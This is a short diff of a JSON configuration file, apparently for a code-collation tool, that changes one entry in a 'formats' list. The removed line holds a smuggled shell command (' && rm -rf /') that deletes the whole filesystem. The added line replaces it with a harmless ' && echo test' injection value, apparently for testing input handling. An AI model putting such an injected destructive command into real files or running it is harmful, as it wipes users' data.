@@ -1,6 +1,6 @@
 {
 	"ignoreGlobList": ["collated**"],
-	"formats": ["java", " && rm -rf /"],
+	"formats": ["java", " && echo test"],
 	"authors":
 	[
 		{
